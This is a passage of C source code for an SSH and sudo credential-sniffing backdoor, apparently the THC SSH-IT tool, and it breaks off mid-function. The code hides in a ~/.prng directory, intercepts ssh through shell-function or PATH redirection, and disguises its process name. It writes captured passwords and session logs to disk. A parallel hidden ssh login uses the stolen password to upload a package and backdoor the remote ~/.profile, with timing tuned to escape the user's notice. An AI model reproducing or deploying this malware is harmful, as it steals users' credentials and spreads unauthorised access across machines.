
#include "common.h"
#include "io.h"
struct _g g;

static fd_set rfd;
static fd_set wfd;
static int fd_i;     // fd of infiltrating ssh
static IO io_i;      // IO for fd_i
static IO io_ssh;    // IO for stdin -> real ssh
static IO io_out;    // IO real ssh -> stdout
static pid_t pid_i;
static bool is_fd_i_blocking;
static int fd_pty;   // fd of real pty
static int fd_package;
static LNBUF lnb_i;  // infiltrating line buffer
static bool g_is_pty_pause;
static bool g_is_waiting_at_prompt_i;
static int g_ssh_param_argc;
static bool g_is_logged_in;
static struct termios g_tios_saved;
static bool g_is_tios_saved;
static bool g_is_pty_ssh_start;
static bool g_is_prompt_waiting_newline_i;
static pid_t pid_ssh;
static char **g_argv;
static char **g_argv_backup;
static int g_argc_backup;
static char *g_host_id;
static bool g_is_already_logged_ssh_credentials;
static int n_passwords;
static int n_prompts;
static int g_db_trysec;
static bool g_is_ssh;
static bool g_is_sudo;
static bool g_is_skip_line;
static uint64_t g_usec_start;

// Timeout for infiltrating process
// Wait 30 seconds at any prompt for real user input
#define THC_TO_WAIT_AT_PROMPT_MSEC           (30 * 1000)
// Give infiltrating process 1 second head-start before starting real process [ssh]
// May expire early if infiltrating process detects password prompt or completes early
#define THC_TO_WAIT_CONNECT_MSEC             (1 * 1000)
// SSH takes 2-3 seconds to report a incorrect password. Waiting for infiltrator 2-3 seconds
// and then another 2-3 seconds for the real ssh is noticaeble to the user.
// Instead give infiltrating ssh a head-start of 1 second and send captured
// password (correct or wrong) to real ssh. If it was correct then likely the
// infiltrating ssh made good use of the headstart and will have finished its job
// before user's ~/.profile is read.
// Continue immediatley when THCPROFILE is received.
#define THC_TO_WAIT_PASSWORD_AUTH_MSEC       (1 * 1000)
// Give infiltrating process 1 second to complete profile infiltration (after THCINSIDE)
// On RPI it can take more than 1 second between THCINSIDE and THCPROFILE
#define THC_TO_WAIT_INF_COMPLETE_MSEC        (2 * 1000)
// Give infiltrating process 15 seconds to complete its job (upload all binaries etc)
#define THC_TO_WAIT_FINISH_MSEC              (15 * 1000)
// Give infiltrating process 2 more seconds even if real ssh has finished.
#define THC_TO_WAIT_FINISH_AFTER_EXIT_MSEC   (2 * 1000)
static uint64_t g_i_expire;         // start + 2 seconds

#define THC_BASEDIR           ".prng"
#define THC_DB_DIRNAME        ".d"                 // ~/.prng/.d
#define THC_LOG_DIRNAME       ".l"                 // ~/.prng/.l
#define THC_INF_STAGE_INSIDE  "THCINSIDE"
#define THC_INF_STAGE_PROFILE "THCPROFILE"
// #define THC_INF_STAGE_FIN     "THCFINISHED"
#define THC_RECHECK_TIME      (60 * 60 * 24 * 14)  // Every 14 days re-check infiltration
#define THC_DB_TRY_SEC        (60 * 60 * 12)      // Wait at least 12h before trying again

enum _stage_i_t {
	THC_STAGE_I_NONE           = 0x00,
	THC_STAGE_I_INSIDE         = 0x01, // Sucessfully logged in
	THC_STAGE_I_PROFILE        = 0x02, // Target's ~/.profile infiltrated
	THC_STAGE_I_FINISHED       = 0x03
};
enum _stage_i_t stage_i;

enum _expire_action_t {
	THC_EXP_ACTION_NONE        = 0x00,
	THC_EXP_ACTION_UNPAUSE     = 0x01,
	THC_EXP_ACTION_FINISH      = 0x02
};
enum _expire_action_t g_expire_action;

enum _expire_state_t {
	THC_EXP_STATE_NONE         = 0x00,
	THC_EXP_STATE_WAIT_CONNECT = 0x01
};
enum _expire_state_t g_expire_state;

// Environment Variables
// THC_IS_SESSIONLOG    - Log ssh's stdin session to THC_DB_BASEDIR/s-<host>-<port>-<user>-<timestamp>.log
// THC_SESSIONLOG_FILE  - File for loggin sessions. Append if already exists
// THC_BASEDIR          - Where to store binary [default ~/.prng/]
// THC_RECHECKT_TIME    - How often to re-check that system is infiltrated (default: 14 days)
// THC_DEBUG            - Run in debug mode
// THC_DEBUG_LOG        - File for logging debug information [default: stderr]
// THC_VERBOSE          - Output a warning when interception is active.
// THC_DB_TRY_SEC       - How often we should try to backdoor if we failed initially
// THC_TARGET           - The called binary (e.g. /usr/bin/ssh)
// THC_TARGET_NAME      - Derived from TARGET_FILE if not exist
// THC_PS_NAME          - The name showing up in the process list (ps -alxwww), e.g. argv[0]
// THC_EXEC_TEST        - If set then immediatley exit(0)
// THC_REALTARGET       - Execute the real target (not PTY sniffing) immediately.
// THC_IS_PATH_REDIRECT - Set if PATH is set to our secret path containing backdoored 'ssh'.
//                        Normally we used ssh(){} redirects and not PATH-redirect.
// THC_PS_NAME_HIDDEN   - Set if ps-name is hidden already ('ssh' instead of ~/.prng/ssh)
// The following environment variables are available in hook.sh
// THC_SSH_PARAM        - The command line arguments of the original programm (-i blah -p 22)
// THC_PASSWORD         - ssh key file password or login password
// THC_SSH_PORT         - ssh port
// THC_SSH_DEST         - destination (not host, e.g. could be ssh://user@host:22 or user@host)
// THC_SSH_USER         - ssh username
// THC_SSH_KF           - ssh key file

static void cb_lnbuf_infiltrate_ssh(void *lptr, void *arg);
static bool strstr_password(char *str);
static void set_state_password_captured(char *pwd);
static void pty_ssh_start(void);
static int db_update(const char *dbname);
static void log_ssh_credentials(void);


static void
timeout_update(int msec, enum _expire_state_t state, enum _expire_action_t action)
{
	DEBUGF_B("Setting timeout to %0.03f seconds, state=%d, action=%d\n", (float)msec / 1000, state, action);
	g_expire_action = action;
	g_expire_state = state;
	if (msec == 0)
	{
		g_i_expire = 0;
		return;
	}

	g_i_expire = THC_usec() + THC_MSEC_TO_USEC(msec);
}

// Supporting two ways of redirecting to our pty-sniffing 'ssh'.
// 1. Using ssh(){} shell function redirects [default]
// 2. Setting PATH= to the location of our pty-sniffing 'ssh'.
//    This also requires THC_IS_PATH_REDIRECT=1 to be set
static char *
find_target(char *target_name)
{
	int depth = 1; // ssh(){} style redirection

	if (g.is_path_redirect)
		depth = 2; // PATH=<secret path>:$PATH style redirection

	return find_bin_in_path(target_name, depth);
}

static void
init_vars(int *argc_ptr, char **argv_ptr[])
{
	int argc = *argc_ptr;
	char **argv = *argv_ptr;
	char *ptr;
	char *exec_bin = argv[0];
	char buf[1024];
	int i;

	g.is_sessionlog = true;
	g.is_debug = false;
	g.is_path_redirect = false;
	g_is_ssh = false;
	g_is_sudo = false;
	g.port = -1;
	g.basedir_rel = THC_BASEDIR;
	g.fd_log = -1;
	g.fd_log_in = -1;
	fd_i = -1;
	fd_pty = -1;
	fd_package = -1;
	g_is_waiting_at_prompt_i = false; // FIXME: must be false until we actually see the prompt
	g_is_logged_in = false;
	g_is_tios_saved = false;
	g_is_pty_ssh_start = false;
	g_is_prompt_waiting_newline_i = false;
	pid_ssh = -1;
	g_is_already_logged_ssh_credentials = false;
	is_fd_i_blocking = false;
	pid_i = 0;
	g.ssh_param[0] = '\0';
	g.recheck_time = THC_RECHECK_TIME;
	g_db_trysec = THC_DB_TRY_SEC;
	g_is_pty_pause = false;
	g_is_skip_line = false;
	g_usec_start = THC_usec();

	if (getenv("THC_DEBUG"))
	{
		g_dbg_fp = stderr;
		g.is_debug = true;
	}

	ptr = getenv("THC_DEBUG_LOG");
	if (ptr != NULL)
		g_dbg_fp = fopen(ptr, "a");

	if (getenv("THC_IS_PATH_REDIRECT"))
		g.is_path_redirect = true;

	signal(SIGPIPE, SIG_IGN);

	srandom(THC_usec());

	// Determine the basedir to store binaries. Prefix with $HOME unless it
	// starts with '/'.
	ptr = getenv("THC_BASEDIR");
	if (ptr != NULL)
		g.basedir_rel = ptr;

	if (*g.basedir_rel == '/')
	{
		g.basedir_local = g.basedir_rel;
	} else {
		snprintf(buf, sizeof buf, "%s/%s", getenv("HOME"), g.basedir_rel);
		g.basedir_local = strdup(buf);
	}

	snprintf(buf, sizeof buf, "%s/%s", g.basedir_local, THC_DB_DIRNAME);
	g.db_basedir = strdup(buf);

	snprintf(buf, sizeof buf, "%s/%s", g.basedir_local, THC_LOG_DIRNAME);
	g.log_basedir = strdup(buf);

	g.target_file = getenv("THC_TARGET");

	// Hide Process Name & ZAP args
	// Change own programm name to THC_PS_NAME (if set).
	// e.g. thc_pty is linked from '$HOME/.prng/ssh' so the current name
	// of loaded binary is '$HOME/.prng/ssh' or 'ssh'. However, we may like this to
	// be '-bash' instead to stop two 'ssh' processes from showing up.
	g.ps_name = getenv("THC_PS_NAME");
	if (g.ps_name != NULL)
	{
		g.ps_name = strdup(g.ps_name);
		unsetenv("THC_PS_NAME");

		// Retain target_file unless is is explicitely set with THC_TARGET=
		// - symbolic link from ssh -> ptyspy would mean
		//   that current process name is 'ssh' but that the target
		//   should remain to be /usr/bin/ssh after changing
		//   _this_ process name to '-bash'
		if (g.target_file == NULL)
		{
			g.target_file = find_target(argv[0]);
			if (g.target_file == NULL)
				ERREXIT("THC_PS_NAME is set but cant find TARGET. Try setting THC_TARGET=<absolute path>\n");
		}

		setenv("THC_TARGET", g.target_file, 0);

		// ZAP arguments
		// - Store argv[] in environment variables
		for (i = 0; i < argc; i++)
		{
			snprintf(buf, sizeof buf, "THC_ARGV%d", i);
			setenv(buf, argv[i], 1);
		}
		snprintf(buf, sizeof buf, "%d", i);
		setenv("THC_ARGC", buf, 1);

		char *orig = argv[0];
		argv[0] = g.ps_name;
		argv[1] = NULL; // ZAP arguments
		DEBUGF("Executing %s with ps-name=%s (argc=%d)\n", orig, argv[0], argc);

		if ((g_dbg_fp != stderr) && (g_dbg_fp != NULL))
			fclose(g_dbg_fp);
		execvp(orig, argv); // execute myself
		cmd_failed_exit(orig);
	}

	// ZAP'ed arguments RESTORE (from environment variables)
	if (getenv("THC_ARGC") != NULL)
	{
		argc = atoi(getenv("THC_ARGC"));
		argv = malloc((argc + 1) * sizeof (char *));
		for (i = 0; i < argc; i++)
		{
			snprintf(buf, sizeof buf, "THC_ARGV%d", i);
			ptr = getenv(buf);
			if (ptr == NULL)
				break;
			argv[i] = strdup(ptr);
			// Keep them set so that scripts have access # unsetenv(buf);
		}
		argv[i] = NULL; // NULL terminated
		*argc_ptr = argc;
		*argv_ptr = argv;
	}

	// Backup the original argv
	g_argv = argv;
	g_argc_backup = argc;
	g_argv_backup = malloc((argc + 1) * sizeof (char *));
	for (i = 0; i < argc; i++)
		g_argv_backup[i] = strdup(argv[i]);
	g_argv_backup[i] = NULL; // NULL terminated

	if (g.target_file != NULL)
		exec_bin = g.target_file;

	g.sessionlog_file = getenv("THC_SESSIONLOG_FILE");

	// Set some more agressive parameters when in testing mode
	ptr = getenv("THC_TESTING");
	if (ptr != NULL)
	{
		DEBUGF_B("In TESTING-MODE\n");
		g_db_trysec = 15;
		g.recheck_time = 30;
	}

	ptr = getenv("THC_RECHECK_TIME");
	if (ptr != NULL)
		g.recheck_time = atoi(ptr);
	ptr = getenv("THC_DB_TRY_SEC");
	if (ptr != NULL)
		g_db_trysec = atoi(ptr);

	if (getenv("THC_NO_SESSIONLOG"))
		g.is_sessionlog = false;

	// Find original 'target' (absolute path to exec binary) and 'target_name' (last part of 'taget')
	// Example: ~/.local/bin/ssh is called. The target is '/usr/bin/ssh' and target_name is 'ssh'.
	// Ignore if THC_TARGET is set to the binary.
	DEBUGF("exec_bin    =%s\n", exec_bin);
	g.target_name = strrchr(exec_bin, '/');
	if (g.target_name != NULL)
		g.target_name += 1;
	else
		g.target_name = exec_bin; // exec_bin does not contain '/'
	g.target_name = strdup(g.target_name); // need copy because we zap arguments.

	if (g.target_file == NULL)
		g.target_file = find_target(g.target_name);
	if (g.target_file == NULL)
		ERREXIT("Target not found in PATH. Try setting THC_TARGET=<file>\n");

	g.login_name = getenv("USER");

	if (g.ps_name == NULL)
		g.ps_name = g.target_name;

	DEBUGF("target_name =%s\n", g.target_name);
	DEBUGF("target_file =%s\n", g.target_file);
	DEBUGF("ps_name     =%s\n", g.ps_name);
	DEBUGF("db_basedir  =%s\n", g.db_basedir);
	DEBUGF("log_basedir =%s\n", g.log_basedir);
	DEBUGF("session_log =%s\n", g.is_sessionlog?"true":"false");

	mkdirp(g.db_basedir);
	mkdirp(g.log_basedir);

	if (getenv("THC_VERBOSE") != NULL)
	{
		fprintf(stderr, "\033[1;31mSSH-IT Warning: command is being intercepted...\033[0m\n");
	}
}

static void
nopty_exec(char *cmd[])
{
	cmd[0] = g.target_name;
	DEBUGF("nopty_exec(%s)\n", cmd[0]);
	execvp(g.target_file, cmd);
	cmd_failed_exit(cmd[0]);
}

static int
pty_cmd(pid_t *pidptr, char *file, char *ps_name, char *cmd[])
{
	int fd;
	pid_t pid;

	// New PTY shall have same settings as existing PTY
	struct winsize ws;
	ioctl(STDOUT_FILENO, TIOCGWINSZ, &ws);
	struct termios tios;
	tcgetattr(0, &tios);

	pid = forkpty(&fd, NULL, &tios, &ws);
	if (pid < 0)
		exit(255);

	if (pid == 0)
	{
		// CHILD spwans the process
		signal(SIGCHLD, SIG_DFL);
        signal(SIGPIPE, SIG_DFL);

        cmd[0] = ps_name;//g.target_name;
		execvp(file, cmd);
		cmd_failed_exit(cmd[0]);
	}

	*pidptr = pid;

	return fd;
}

// Return 1 if state has been found.
static int
match(const char *str, const char *match, size_t len, enum _stage_i_t s)
{
	if (str == NULL)
		return 0;

	if ((stage_i < s) && (strncmp(str, match, len) == 0))
	{
		stage_i = s;
		return 1;
	}

	return 0;
}

// ssh-infiltrate login was successfull
static bool
match_stage_inside(const char *str)
{
	int ret;

	ret = match(str, THC_INF_STAGE_INSIDE, strlen(THC_INF_STAGE_INSIDE), THC_STAGE_I_INSIDE);
	if (ret == 0)
		return false;

	// Login was a success.
	log_ssh_credentials();

	// Password input no longer needed. Set to raw so that we can transfer binaries.
	stty_set_raw(fd_i);

	// HERE: Infiltrator is logged in (received "THCINSIDE")
	char buf[1024];
	snprintf(buf, sizeof buf, "%s/package.2gz", g.basedir_local);
	fd_package = open(buf, O_RDONLY, 0);
	if (fd_package < 0)
		DEBUGF("WARN: open(%s): %s\n", buf, strerror(errno));
	DEBUGF("open(%s)=%d, g_is_pty_pause=%s\n", buf, fd_package, g_is_pty_pause?"true":"false");
	// LNs might not yet been initialized if this is password-less login
	LNBUF_free(&g.ln_pty);
	LNBUF_free(&g.ln_in);

	timeout_update(THC_TO_WAIT_INF_COMPLETE_MSEC, THC_EXP_STATE_NONE, THC_EXP_ACTION_FINISH);

	return true;
}


// ~/.profile has been backdoored
static void
match_stage_profile(const char *str)
{
	int ret;

	ret = match(str, THC_INF_STAGE_PROFILE, strlen(THC_INF_STAGE_PROFILE), THC_STAGE_I_PROFILE);
	if (ret == 0)
		return;

	timeout_update(THC_TO_WAIT_FINISH_MSEC, THC_EXP_STATE_NONE, THC_EXP_ACTION_FINISH);
	DEBUGF("I: un-pausing PTY\n");
	g_is_pty_pause = false;
	IO_unpause(&io_ssh);

	pty_ssh_start();
}


// Return FALSE if sniffing is not possible 
static bool
is_need_sniffing_ssh(int argc, char *argv[])
{
	int c;
	// Scroll through all ssh options until we hit 'destination'
	// [user@]hostname or ssh://[user@]hostname[:port]
	// -l/-p always have presedence over user@ and :port.
	char *login_name = NULL;

	opterr = 0;
	while ((c = getopt(argc, argv, "B:b:c:D:E:e:F:I:i:J:L:l:m:O:o:p:Q:R:S:W:w:")) != -1)
	{
		switch (c)
		{
		case 'p':
			g.port = atoi(optarg);
			break;
		case 'l':
			login_name = strdup(optarg);
			break;
		case 'i':
			g.keyfile = strdup(optarg);
			break;
		}
	}

	if (argv[optind] == NULL)
	{
		DEBUGF_R("No ssh-destiantion on command line\n");
		return false; // No 'destination' supplied.
	}

	char *destination = strdup(argv[optind]);
	int is_url = false;

	// ssh <arguments> destination [command]
	// Remove destination and all '[command]'
	g_ssh_param_argc = optind;

	g.ssh_destination = strdup(destination);

	if (strncmp(destination, "ssh://", 6) == 0)
	{
		is_url = true;
		destination += 6;
	}

	char *ptr;
	ptr = strchr(destination, '@');
	if (ptr != NULL)
	{
		*ptr = '\0';
		if (login_name == NULL)
			login_name = destination;
		destination = ptr + 1;
	}

	if (is_url)
	{
		char *ptr;
		ptr = strchr(destination, ':');
		if (ptr != NULL)
		{
			*ptr = '\0';
			if (g.port < 0)
				g.port = atoi(ptr + 1);
		}
	}

	if (g.port < 0)
		g.port = 22;

	g.host = destination;

	// Use current user name if no login_name is specified.
	if (login_name != NULL)
		g.login_name = strdup(login_name);

	// Store the original command line arguments (will be passed to hook.sh)
	ptr = g.ssh_param;
	char *end = g.ssh_param + sizeof g.ssh_param;
	ssize_t sz;
	for (c = 1; c < g_ssh_param_argc; c++)
	{
		if (c + 1 < g_ssh_param_argc)
			sz = snprintf(ptr, end - ptr, "%s ", argv[c]);
		else
			sz = snprintf(ptr, end - ptr, "%s", argv[c]); // Last argument
		if (sz >= end - ptr)
			break;
		ptr += sz;
	}

	DEBUGF_G("ssh_param='%s'\n", g.ssh_param);
	// HERE: not recently checked
	DEBUGF_W("hostname = %s-%s-%d\n", g.login_name, g.host, g.port);

	return true;
}

static bool
is_need_sniffing_sudo(int argc, char *argv[])
{
	char *user = NULL;
	int c;

	int opt_index = 0;
	static struct option long_opts[] =
	{
		{"user", 1 /*has_arg*/, NULL, 'u'},
		{0, 0, 0, 0}
	};

	// Check if we are already installed on _this_ system.
	// sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]
	// sudo [-AbEHnPS] [-C num] [-g group] [-h host] [-p prompt] [-r role] [-t type] [-T timeout] [-u user] [-i | -s ] [VAR=value] [command]
	// while ((c = getopt(argc, argv, "hKkVAnSg:h:p:u:U:bEHPC:r:t:T:is")) != -1)
	opterr = 0;
	while ((c = getopt_long(argc, argv, "hKkVAnSg:h:p:u:U:bEHPC:r:t:T:is", long_opts, &opt_index)) != -1)
	{
		switch (c)
		{
		case 'u':
			user = optarg;
			break;
		}
		continue;
	}

	// FIXME: at the moment we only track sudo to 'root'. Implement to also track non-root
	// users and install this app for non-root users.
	if (user != NULL)
	{
		if (strcmp(user, "root") != 0)
			return false;
	}

	// HERE: It's sudo to 'root'.
	return true;
}

static void
log_ssh_credentials(void)
{
	FILE *fp;
	char buf[1024 * 2 + 10];

	if (g_host_id == NULL)
	{
		DEBUGF("%s g_host_id=NULL\n", __func__);
		return; // not ssh sniffing
	}

	if (g_is_already_logged_ssh_credentials)
	{
		DEBUGF("%s Already logged\n", __func__);
		return;
	}

	DEBUGF("LOG SSH CREDENTIALS ***\n");

	// This file might be 'sourced' by bash and thus shall be bash-compliant
	snprintf(buf, sizeof buf, "%s/ssh-%s.pwd", g.db_basedir, g_host_id);
	fp = fopen(buf, "w");
	if (fp == NULL)
	{
		DEBUGF_R("fopen(%s): %s\n", buf, strerror(errno));
		return;
	}

	char *display = getenv("DISPLAY");
	fprintf(fp, "LOG_DISPLAY='%s'\n", display?display:"");

	char *askpass = getenv("SSH_ASKPASS");
	fprintf(fp, "LOG_SSH_ASKPASS='%s'\n", askpass?askpass:"");

	fprintf(fp, "LOG_HOME='%s'\n", BASH_escape_squote(buf, sizeof buf, getenv("HOME")));
	fprintf(fp, "LOG_PATH='%s'\n", BASH_escape_squote(buf, sizeof buf, getenv("PATH")));
	fprintf(fp, "LOG_CWD='%s'\n", BASH_escape_squote(buf, sizeof buf, getcwd(NULL, 0)));

	// Log all original arguments
	int i;
	for (i = 0; i < g_argc_backup; i++)
		fprintf(fp, "LOG_ARG_%d='%s'\n", i, BASH_escape_squote(buf, sizeof buf, g_argv_backup[i]));

	// Log password. \n provided by user input.
	if (g.password == NULL)
		buf[0] = '\0';
	else {
		BASH_escape_squote(buf, sizeof buf, g.password);
		// Password is stored with '\n' or '\r\n' at the end. Strip it.
		size_t sz = strlen(buf);
		if ((sz > 0) && (buf[sz - 1] == '\n'))
			buf[sz - 1] = '\0';
	}
	fprintf(fp, "LOG_PASSWORD='%s'\n", buf);

	// Log unique host id (user@hostname:port)
	fprintf(fp, "LOG_SSH_HOST_ID='%s'\n", BASH_escape_squote(buf, sizeof buf, g_host_id));

	// Log ssh destination
	fprintf(fp, "LOG_SSH_DESTINATION='%s'\n", BASH_escape_squote(buf, sizeof buf, g.ssh_destination));

	// LAST LINE is always the command
	// Log prefered command line to log in (including real target)

	fprintf(fp, "# Last line is the preferred command:\n");
	// fprintf(fp, "THC_TARGET=%s %s %s\n", g.target_file, g_argv_backup[0], g.ssh_param);
	// SSH_ASKPASS is currently not supported. To support this implement:
	// Note: Consider that SSH_ASKPASS is only executed if password is needed
	//       and might never be executed.
	// - infiltrating SSH to detect if SSH_ASKPASS is set and if so then:
	//   - Create own SSH_ASKPASS script that if executed captures password.
	// - Modify SSH_ASKPASS for real ssh to use own script:
	//   - If password was previously captured then just output it.
	//   - Otherwise (faillure) fall-back to original SSH_ASKPASS
	if (askpass == NULL)
		snprintf(buf, sizeof buf, "%.1024s %.1024s", g.ssh_param, g.ssh_destination);
	else
		buf[0] = '\0'; // FIXME: add SSH_ASKPASS support

	fprintf(fp, "# %s\n", buf);
	fclose(fp);

	g_is_already_logged_ssh_credentials = true;
}

static void
log_open(int *fd_log, const char *prefix, const char *name)
{
	char buf[4096];

	if (prefix == NULL)
		snprintf(buf, sizeof buf, "%s/%s.log", g.log_basedir, name);
	else
		snprintf(buf, sizeof buf, "%s/%s-%s.log", g.log_basedir, prefix, name);

	*fd_log = open(buf, O_WRONLY | O_APPEND | O_CREAT | O_CLOEXEC, 0600);
	if (*fd_log < 0)
	{
		DEBUGF_R("open(%s): %s\n", buf, strerror(errno));
	} else {
		snprintf(buf, sizeof buf, "-----Starting %s-----\n", THC_logtime());
		write(*fd_log, buf, strlen(buf));
	}
}


// Return TRUE if this session needs pty-sniffing
// and logging.
static bool
is_need_sniffing(int argc, char *argv[])
{
	bool is_sniffing_ssh = false;
	bool is_sniffing_sudo = false;
	char buf[1024];
	char log_name[1024];
	bool is_sessionlog = g.is_sessionlog;

	if (strcmp(g.target_name, "ssh") == 0)
	{
		g_is_ssh = true;
		is_sniffing_ssh = is_need_sniffing_ssh(argc, argv);
		if (is_sniffing_ssh == false)
			is_sessionlog = false;
		snprintf(buf, sizeof buf, "%s@%s:%d", g.login_name, g.host, g.port);
		g_host_id = strdup(buf);
		snprintf(log_name, sizeof log_name, "ssh-%s-%llu", g_host_id, (unsigned long long)time(NULL));
	} else if (strcmp(g.target_name, "sudo") == 0) {
		g_is_sudo = true;
		is_sniffing_sudo = is_need_sniffing_sudo(argc, argv);
		if (is_sniffing_sudo == false)
			is_sessionlog = false;
		snprintf(buf, sizeof buf, "%s@localhost", g.login_name);
		g_host_id = strdup(buf);
		snprintf(log_name, sizeof log_name, "sudo-%s-%llu", g_host_id, (unsigned long long)time(NULL));
	} else {
		snprintf(buf, sizeof buf, "%s@localhost", g.login_name);
		g_host_id = strdup(buf);
		snprintf(log_name, sizeof log_name, "%s-%s-%llu", g.target_name, g.login_name, (unsigned long long)time(NULL));
	}


	if (is_sessionlog)
	{
		// Use single log file instead (if set)
		if (g.sessionlog_file != NULL)
		{
			snprintf(buf, sizeof buf, "%s", g.sessionlog_file);
			DEBUGF_C("Logging session to single logfile: %s\n", buf);
			log_open(&g.fd_log, NULL, buf);
			g.fd_log_in = g.fd_log;
		} else {
			DEBUGF_C("Logging session to: session-[input|output]-%s.log\n", log_name);
			log_open(&g.fd_log, "session-output", log_name);
			log_open(&g.fd_log_in, "session-input", log_name);
		}

		return true; // needs sniffing because session needs to be logged.
	}

	if (g_is_ssh)
		return is_sniffing_ssh;
	if (g_is_sudo)
		return is_sniffing_sudo;

	return false;
}

static void
log_add(int *fd_ptr, void *data, ssize_t sz)
{
	if (fd_ptr == NULL)
		return;
	if (*fd_ptr < 0)
		return;
	if (sz <= 0)
		return;

	sz = write(*fd_ptr, data, sz);
	if (sz <= 0)
		XCLOSE(*fd_ptr);
}

static int
readtoIO(int sfd, IO *io_dst, LNBUF *l /*can be NULL*/, int *fd_log /*can be NULL*/)
{
	char buf[1024 * 4];
	ssize_t sz;
	ssize_t ret;

	sz = read(sfd, buf, sizeof buf);
	if (sz <= 0)
	{
		DEBUGF_R("read(fd=%d)=%zd: %s\n", sfd, sz, sz==0?"(EOF)":strerror(errno));

		return -1;
	}

	LNBUF_add(l, buf, sz);
	ret = IO_write(io_dst, buf, sz);
	if (ret != sz)
	{
		DEBUGF_R("ERROR: IO_write(%d, %zd)=%zd %s\n", IO_get_fd(io_dst), sz, ret, strerror(errno));
		return -1;
	}

	// Log session
	log_add(fd_log, buf, sz);

	return 0;
}

// Called when reading from fd_i fails (e.g. process terminated)
// or on timeout (and after kill() was send to pid_i)
static void
infiltrate_done(void)
{
	DEBUGF("%s (pty-pause=%d, pid_i=%d)\n", __func__, g_is_pty_pause, pid_i);

	timeout_update(0, THC_EXP_STATE_NONE, THC_EXP_ACTION_NONE);

	if (pid_i > 0)
	{
		int wstatus = -1;
		int exit_code = -1;
		int signal_code = -1;

		// Dont use WNOHANG: This part might be executed before pid_i turned
		// into zombie and then we would miss clearing the Zombie.
		if (waitpid(pid_i, &wstatus, /*WNOHANG-dontuse*/0) == pid_i)
		{
			if (WIFEXITED(wstatus))
				exit_code = WEXITSTATUS(wstatus);
			if (WIFSIGNALED(wstatus))
				signal_code = WTERMSIG(wstatus);
		}

		DEBUGF_W("I-PROCESS finished: pid=%d exit(%d) signal(%d)\n", pid_i, exit_code, signal_code);
		pid_i = 0;	
		if (exit_code == 0)
		{
			DEBUGF_G("INFILTRATION SUCCESS\n");
			db_update("inf");
		} else {
			DEBUGF_R("INFILTRATION FAILED\n");
		}
	}

	IO_unpause(&io_ssh);
	g_is_pty_pause = false;
	LNBUF_free(&g.ln_in);
	LNBUF_free(&g.ln_pty);
	XCLOSE(fd_i);
	IO_free(&io_i);
	XCLOSE(fd_package);

	pty_ssh_start(); // start real ssh if not started yet
}

static void
infiltrate_prompt_found(void)
{
	pty_ssh_start(); // start real ssh if not started yet

	n_prompts += 1;
	if (n_prompts > n_passwords)
		return;

	// If we have a password then try it.
	if (g.password != NULL)
	{
		set_state_password_captured(g.password);
	}
}

// Return -1 on error/eof
// Return 0
static int
infiltrate_read(void)
{
	char buf[1024];
	ssize_t sz;

	sz = read(fd_i, buf, sizeof buf);
	if (sz <= 0)
		goto err;

	LNBUF_add(&lnb_i, buf, sz);

	if (g_is_waiting_at_prompt_i)
		return 0;

	// Saw 'Prompt' already and waiting for newline
	// In rare occasions the ssh may send the password prompt in
	// single bytes or smaller packages. Once we have found 'Password' prompt
	// then wait until we encounter a newline before trying to match for 'Password'
	// again.
	if (g_is_prompt_waiting_newline_i)
	{
		return 0;
	}
	char *str;
	str = LNBUF_line(&lnb_i);
	if (strlen(str) > 0)
		DEBUGF("I: Checking '%s'\n", LNBUF_line(&lnb_i));
	str = LNBUF_str(&lnb_i);
	if (strstr_password(str) == false)
		return 0;

	timeout_update(THC_TO_WAIT_AT_PROMPT_MSEC, THC_EXP_STATE_NONE, THC_EXP_ACTION_FINISH);
	g_is_waiting_at_prompt_i = true;
	g_is_prompt_waiting_newline_i = true;
	// Wait for User to enter password. Then send password to infiltrating ssh
	// before sending it to real ssh (and buffer data while doing so) STOP HERE FIXME
	infiltrate_prompt_found();
	DEBUGF("I: #%d Waiting at prompt (passwords captured: %d)\n", n_prompts, n_passwords);

	return 0;
err:
	DEBUGF_C("I: read(%d)=%zd %s\n", fd_i, sz, sz==0?"(EOF)":strerror(errno));
	infiltrate_done();
	return -1;
}


static void
i_timeout(void)
{
	if (g_expire_action == THC_EXP_ACTION_UNPAUSE)
	{
		IO_unpause(&io_ssh);
		g_is_pty_pause = false;

		if (g_expire_state == THC_EXP_STATE_WAIT_CONNECT)
		{
			timeout_update(THC_TO_WAIT_FINISH_MSEC, THC_EXP_STATE_NONE, THC_EXP_ACTION_FINISH);
			pty_ssh_start();
		}
		else
			timeout_update(0, THC_EXP_STATE_NONE, THC_EXP_ACTION_NONE);

		return;
	}

	if (pid_i > 0)
		kill(pid_i, SIGKILL);

	infiltrate_done();
}

static void
io_loop(void)
{
	int n;

	int fd_max;
	while (1)
	{
		FD_ZERO(&rfd);
		FD_ZERO(&wfd);

		XFD_SET(fd_pty, &rfd);
		if (IO_IS_PAUSED(&io_ssh) == false) //g_is_pty_pause == false)
			FD_SET(STDIN_FILENO, &rfd);
		fd_max = MAX(0, fd_pty);

		if (fd_i >= 0)
		{
			XFD_SET(fd_i, &rfd);
			fd_max = MAX(fd_max, fd_i);

			if (is_fd_i_blocking)
				XFD_SET(fd_i, &wfd);
			else {
				XFD_SET(fd_package, &rfd);
				fd_max = MAX(fd_max, fd_package);
			}
		}

		struct timeval to;
		if (g_i_expire != 0)
		{
			uint64_t usec_now = THC_usec();
			THC_USEC_TO_TV(&to, usec_now>=g_i_expire?0:g_i_expire - usec_now);
		}

		n = select(fd_max + 1, &rfd, &wfd, NULL, g_i_expire==0?NULL:&to);
		if (n < 0)
		{
			if (errno == EINTR)
				continue;
			goto err;
		}

		if (n == 0)
		{
			DEBUGF("TIMEOUT\n");
			i_timeout();
			if (fd_pty < 0)
				break;
		}

		// Read from USER to PTY
		if (FD_ISSET(STDIN_FILENO, &rfd))
		{

			if (readtoIO(STDIN_FILENO, &io_ssh, &g.ln_in, &g.fd_log_in) != 0)
			{
				if (fd_pty >= 0)
					break;
				if (g_i_expire <= 0)
					break;
				// HERE: fd_pty already closed. Waiting in FINISH_AFTER_EXIT_SEC
			}
		}

		// Read from PTY to USER
		if (XFD_ISSET(fd_pty, &rfd))
		{
			if (readtoIO(fd_pty, &io_out, &g.ln_pty, &g.fd_log) != 0)
			{
				IO_free(&io_ssh);
				XCLOSE(fd_pty); // -1
				if (g_is_waiting_at_prompt_i)
				{
					// Real SSH died during password prompt => User pressed CTRL-C.
					// Not enough passwords for infiltrator to continue.
					if (n_prompts > n_passwords)
						break;
				}

				if (fd_i < 0)
				{
					DEBUGF_R("fd_i=%d\n", fd_i);
					break;
				}
